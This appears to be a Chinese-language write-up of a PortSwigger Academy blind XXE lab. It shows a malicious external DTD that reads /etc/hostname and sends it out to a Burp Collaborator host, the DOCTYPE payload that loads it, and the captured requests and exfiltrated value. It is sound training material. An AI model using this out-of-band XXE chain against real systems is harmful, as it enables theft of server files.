```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.




這個實驗室有一個“檢查庫存”功能，它解析 XML 輸入但不顯示結果。

要解決實驗室問題，請洩露 `/etc/hostname` 文件的內容。

＃＃＃＃ 筆記

為了防止 Academy 平台被用於攻擊第三方，我們的防火牆阻止了實驗室與任意外部系統之間的交互。 要解決實驗室問題，您必須使用提供的漏洞利用服務器和/或 Burp Collaborator 的默認公共服務器。


```


### 官方給的 malicious DTD
```xml

<!ENTITY % file SYSTEM "file:///etc/hostname"> 


<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> 


%eval; %exfil;


```


## 解釋:

### 1.定義 file 變數  請求file:///etc/hostname
```
<!ENTITY % file SYSTEM "file:///etc/hostname"> 
```


### 2.定義 eval 變數 是一個字串
```
<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>
```


### 3.在定義 eval 變數時 file 變數已經被調用
```
<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>
```

### eval 字串變數 =
```
<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=file:///etc/hostname;'>
```


### 4.eval 字串變數被調用生成的字串剛好定義了 exfil  

(&#x25;   =   %)
https://www.codetable.net/hex/25

```
<!ENTITY % exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=file:///etc/hostname;'>
```


### 5.exfil 最後被調用請求 url
```
http://BURP-COLLABORATOR-SUBDOMAIN/?x=file:///etc/hostname
```







### 官方給的 payload
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

```

解釋:
定義 xxe 變數 為一段外部的DTD url ，並調用。



所以整段看下來，應該還是用了OOB 帶外攻擊

1.應該要去包含我們的惡意 DTD

2.惡意 DTD 最後會請求我們的dns log，x參數帶出 file:///etc/hostname
```
http://BURP-COLLABORATOR-SUBDOMAIN/?x=file:///etc/hostname
```




BP  collaborator client 生成 dns server 地址:
```
gxhib2t6d7ne9mbrrk0kp8a2jtpjd8.burpcollaborator.net
```



### 惡意DTD網址的server 

這裡BP 很好心的為我們設置了一個 
body  (用自己的 BP  collaborator dns  地址 )
```


<!ENTITY % file SYSTEM "file:///etc/hostname"> 


<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://gxhib2t6d7ne9mbrrk0kp8a2jtpjd8.burpcollaborator.net/?x=%file;'>"> 


%eval; %exfil;



```


儲存後 view exploit 確認這個url 
```
https://exploit-0a1b00480360175dc004518f011200b6.exploit-server.net/exploit
```


會response 惡意DTD
```
<!ENTITY % file SYSTEM "file:///etc/hostname"> 


<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://gxhib2t6d7ne9mbrrk0kp8a2jtpjd8.burpcollaborator.net/?x=%file;'>"> 


%eval; %exfil;
```

最後修改payload
```

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1b00480360175dc004518f011200b6.exploit-server.net/exploit"> %xxe;]>

```




### BP抓包
```http
POST /product/stock HTTP/1.1
Host: 0a9600bc04de27b7c0421afe00f500e3.web-security-academy.net
Cookie: session=15LbL7xGBpGyThtgscsZCT8CorMG2WOw
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a9600bc04de27b7c0421afe00f500e3.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0a9600bc04de27b7c0421afe00f500e3.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockcheck>
	<productid>3</productid>
	<storeid>1</storeid>
</stockcheck>

```




### 插入payload 引用惡意DTD
```http

POST /product/stock HTTP/1.1
Host: 0ae900e303bd1786c0115154002100cc.web-security-academy.net
Cookie: session=S2C7kbybhbu8l6Nl9xq5rkafTxpCntcB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://0ae900e303bd1786c0115154002100cc.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0ae900e303bd1786c0115154002100cc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1b00480360175dc004518f011200b6.exploit-server.net/exploit"> %xxe;]>

<stockcheck>
	<productid>3</productid>
	<storeid>1</storeid>
</stockcheck>

```




### 回到BP  collaborator client  查看紀錄
```
The Collaborator server received an HTTP request.  The request was received from IP address 34.251.122.40 at 2022-10.-13 14:55:12 UTC

```

http包: x 參數帶出 file:///etc/hostname = 156b1e3fcb09
```http

GET /?x=156b1e3fcb09 HTTP/1.1
User-Agent: Java/17.0.3
Host: gxhib2t6d7ne9mbrrk0kp8a2jtpjd8.burpcollaborator.net
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive


```


提交就成功了。